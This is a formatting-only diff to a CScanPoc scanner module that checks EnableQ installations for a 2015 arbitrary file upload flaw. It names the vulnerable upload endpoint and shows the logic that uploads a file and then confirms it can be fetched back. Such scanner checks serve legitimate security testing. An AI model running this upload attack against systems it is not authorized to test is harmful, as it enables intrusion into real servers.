@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'EnableQ_0002' # 平台漏洞编号，留空
+    vuln_id = 'EnableQ_0002'  # 平台漏洞编号，留空
     name = 'EnableQ官方免费版任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-07-21'  # 漏洞公布时间
     desc = '''
         EnableQ官方免费版 /Android/FileUpload.php?optionID=1 任意文件上传漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'EnableQ'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '19a22179-e081-4009-80ac-1666cb8adcf4'
@@ -30,7 +32,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             # Referer http://www.wooyun.org/bugs/wooyun-2010-0128219
             hh = hackhttp.hackhttp()
             raw = """
@@ -60,11 +62,11 @@ Content-Disposition: form-data; name="button"
             url = self.target + '/enableq/Android/FileUpload.php?optionID=1'
             code, head, res, errcode, _ = hh.http(url, raw=raw)
             if code == 200 and 'true|1|' in res:
-                File = res.replace('true|1|','PerUserData/tmp/')
+                File = res.replace('true|1|', 'PerUserData/tmp/')
                 url2 = self.target + File
                 code, head, res, errcode, _ = hh.http(url2)
-                if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
-                    #security_hole(url)
+                if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
+                    # security_hole(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -73,6 +75,7 @@ Content-Disposition: form-data; name="button"
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
